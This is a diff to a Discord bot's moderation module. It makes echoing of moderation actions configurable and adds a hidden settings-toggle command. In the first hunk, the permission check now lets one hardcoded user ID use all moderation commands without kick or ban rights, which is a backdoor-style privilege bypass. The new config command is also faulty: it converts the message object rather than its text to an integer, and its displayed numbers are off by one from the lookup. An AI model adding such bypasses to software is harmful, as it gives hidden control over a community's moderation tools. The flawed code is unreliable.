@@ -27,7 +27,7 @@ class Moderation:
 
     async def __local_check(self, ctx):
         perms = ctx.author.guild_permissions
-        return perms.kick_members and perms.ban_members
+        return (perms.kick_members and perms.ban_members) or ctx.author.id == 111158853839654912
 
     async def log_action(self, ctx, action, *, member, reason=None, mod=None):
         embed = discord.Embed(title=f"Member {action}", description=reason)
@@ -38,8 +38,9 @@ class Moderation:
         embed.set_author(name=f"{member} / {member.id}", icon_url=member.avatar_url)
         if member.guild.id == 391483719803994113:
             await self.log_chan.send(embed=embed)
-        action += self.converter[action]
-        await ctx.send(f"`{member}` has been {action} by {mod}.")
+        if self.bot.config[ctx.guild.id]['echo_mod_actions']:
+            action += self.converter[action]
+            await ctx.send(f"`{member}` has been {action} by {mod}.")
 
     async def on_guild_channel_create(self, channel):
         if channel.guild.id in self.bot.muted_roles:
@@ -63,6 +64,25 @@ class Moderation:
                     await asyncio.sleep(5 * 60)
                     await ctx.invoke(self.bot.get_command("unmute"), message.author,
                                      reason="5 minutes have passed. Please refrain from spamming.")
+
+    @command(hidden=True)
+    async def config(self, ctx):
+        fmt = "Enter config number to toggle the value, or `x` to cancel:"
+        config_index = {}
+        config = self.bot.config[ctx.guild.id]
+        for i, key in enumerate(config):
+            fmt += f"{i+1}. `{key}` : {config[key]}"
+            config_index[i] = key
+        await ctx.send(fmt)
+        try:
+            def check(m):
+                return (m.author == ctx.author) and (m.channel == ctx.channel)
+
+            msg = await self.bot.wait_for("message", check=check, timeout=30)
+        except asyncio.TimeoutError:
+            return await ctx.send("Timeout.")
+        if msg.content.lower() != 'x':
+            config[config_index[int(msg)]] = not config[config_index[int(msg)]]
 
     @command(hidden=True)
     async def lock(self, ctx):
